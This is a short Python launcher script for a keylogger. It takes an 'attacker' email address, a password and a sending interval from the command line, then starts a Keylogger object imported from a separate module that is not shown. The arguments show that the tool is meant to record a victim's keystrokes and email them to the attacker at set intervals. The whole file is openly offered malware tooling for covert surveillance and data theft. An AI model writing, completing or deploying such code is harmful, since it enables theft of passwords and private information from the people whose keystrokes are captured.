import argparse
import keylogger

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", dest="username", help="Attacker email address")
    parser.add_argument("-p", "--password", dest="password", help="Attacker password")
    parser.add_argument("-i", "--interval", dest="interval", help="Interval between two consecutive emails", default=60)
    options = parser.parse_args()
    if not options.username:
        parser.error("Specify the destination email address")
    elif not options.password:
        parser.error("Specify the authentication details")
    return options

username = get_argument().username
password = get_argument().password
interval = get_argument().interval

my_keylogger = keylogger.Keylogger(interval, username, password)
my_keylogger.start()
